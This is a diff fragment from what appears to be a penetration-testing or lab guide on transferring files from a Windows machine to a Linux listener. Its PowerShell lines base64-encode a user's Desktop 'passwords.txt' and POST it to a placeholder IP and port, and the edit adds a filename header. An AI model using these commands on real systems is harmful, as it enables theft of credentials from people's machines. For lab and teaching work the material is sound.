@@ -227,13 +227,14 @@ python3 file_receiver.py --port <PORT>
 **Source Machine (Windows): Convert file to Base64 string**
 
 ```powershell
-$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\%USERPROFILE%\Desktop\passwords.txt"))
+$file = "C:\Users\bob\Desktop\passwords.txt"
+$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($file))
 ```
 
 **Source Machine (Windows): Send to Linux server**
 
 ```powershell
-Invoke-WebRequest -Uri "http://<IP>:<PORT>/" -Method POST -Body $b64 -ContentType "text/plain"
+Invoke-WebRequest -Uri "http://<IP>:<PORT>/" -Method POST -Body $b64 -Headers @{"X-Filename"="passwords.txt"} -ContentType "text/plain"     
 ```
 
 **Destination Machine (Linux): Rename and restore original format**
